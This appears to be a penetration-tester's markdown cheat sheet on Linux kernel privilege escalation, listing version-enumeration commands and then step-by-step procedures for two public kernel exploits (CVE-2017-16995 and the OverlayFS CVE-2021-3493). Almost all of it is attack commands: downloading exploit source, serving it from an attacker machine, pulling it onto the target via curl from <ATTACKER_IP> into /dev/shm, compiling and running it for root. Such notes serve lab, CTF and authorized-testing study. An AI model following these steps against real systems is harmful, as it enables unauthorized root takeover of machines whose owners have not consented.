---
Primary_category: "[[LINUX PRIVESC]]"
title: "KERNEL ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Enumeration*

##### *OS Version*

```bash
lsb_release -a
cat /etc/os-release
cat /etc/issue
hostnamectl
```

##### *Kernel Version*

Simply run the following command on the target in order to extract the *Kernel* version

```bash
uname -a
```

Once we know the given version, a quick *Google* search should tell us whether the *Kernel* is vulnerable or not

---

#### *CVE-2017-16995*

> ***[CVE-2017-16995](https://vulners.com/zdt/1337DAY-ID-30003)***

> ***[ExploitDB](https://www.exploit-db.com/exploits/44298)***

##### *Setup*

###### *Downloading the Exploit*

> ***From the Attacker*** ⚔️ 

```bash
curl --silent --location --request GET 'https://www.exploit-db.com/raw/44298' --output exploit.c
```

###### *Transferring the Binary to the Target*

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit' --remote-name
```

###### *Compiling the Binary*

> ***From the Target***🎯 

```bash
gcc -o exploit exploit.c
```

```bash
chmod 700 exploit
```

##### *Usage*

```bash
./exploit
```

---

#### *OverlayFS*

> ***[CVE-2021-3493](https://nvd.nist.gov/vuln/detail/CVE-2021-3493)***

> ***[Github PoC](https://github.com/briskets/CVE-2021-3493)***

##### *Setup*

###### *Downloading the Exploit*

> ***From the Attacker*** ⚔️ 

```bash
curl --silent --location --request GET 'https://github.com/briskets/CVE-2021-3493/raw/refs/heads/main/exploit.c' --output exploit.c
```

###### *Transferring the Binary to the Target*

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit' --remote-name
```

###### *Compiling the Binary*

> ***From the Target***🎯 

```bash
gcc -o exploit exploit.c
```

```bash
chmod 700 exploit
```

##### *Usage*

```bash
./exploit
```